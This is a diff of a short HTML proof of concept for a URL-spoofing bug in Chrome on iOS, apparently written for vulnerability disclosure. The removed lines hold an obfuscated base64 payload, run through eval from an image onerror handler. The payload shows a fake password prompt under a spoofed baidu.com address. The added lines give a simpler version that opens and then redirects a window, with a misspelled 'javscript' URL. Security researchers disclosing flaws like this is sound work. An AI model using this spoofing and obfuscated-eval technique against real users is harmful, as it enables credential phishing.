@@ -1,22 +1,9 @@
 <html>
-	<head>
-	    <title>Chrome URL spoofing vulnerability on IOS</title>
-	    <!--
-	        author: evi1m0.bat[at]gmail.com
-	        datetime: 2018/05/03 00:16:27
-	        test version: for iPhone 66.0.3359.122
-	    -->
-	</head>
 	<script>
 	    pwn = () => {
-	        x = open('https://wrong.host.badssl.com/', 'win');
-	        setTimeout(`
-	            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><a href="https://google.com/" id="test">test</a>');
-	            `, 1000);
-	        setTimeout(`
-	            x.close();
-	            window.location='https://wrong.host.badssl.com/';
-	            `, 1300);
+	        x = open('javscript:alert()');
+		    setTimeout(function(){x.location='https://wrong.host.badssl.com/'}, 3000)
+	        
 	    }
 	</script>
 	<h1>
